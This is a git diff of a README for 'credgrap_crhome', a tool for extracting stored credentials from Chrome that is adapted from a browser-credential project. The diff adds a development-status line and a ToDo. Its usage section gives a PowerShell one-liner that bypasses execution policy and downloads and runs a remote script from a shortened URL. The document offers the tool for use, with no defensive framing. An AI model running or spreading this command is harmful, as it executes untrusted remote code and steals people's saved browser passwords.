@@ -1,4 +1,5 @@
 # credgrap_crhome
+## Still in Dev Mode!
 
 Content:      Extract stored credentials from Chrome
 
@@ -9,6 +10,8 @@ Source:       Chrome extraction imported from https://github.com/sekirkity/Brows
 Modification: Chrome Credential extraction fixed and cookie extraction deleted (buggy)
 
 Date:          04/2018
+
+ToDos:         Fixing Username and URL-Regex
 
 ## Usage
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2FcJJ3k’)"
